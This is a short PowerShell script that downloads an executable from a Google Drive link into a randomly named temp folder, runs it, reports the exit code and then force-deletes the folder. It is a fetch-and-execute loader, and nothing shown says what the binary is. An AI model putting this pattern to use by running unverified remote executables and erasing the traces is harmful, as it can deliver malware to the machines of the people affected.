$url = "https://drive.google.com/uc?export=download&id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK"
$tempdir = "$env:TEMP\$(New-Guid)"
mkdir $tempdir | Out-Null
$file = "$tempdir\file.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop
    $proc = Start-Process $file -PassThru -Wait
    "Process exited with code: $($proc.ExitCode)"
}
finally {
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
}
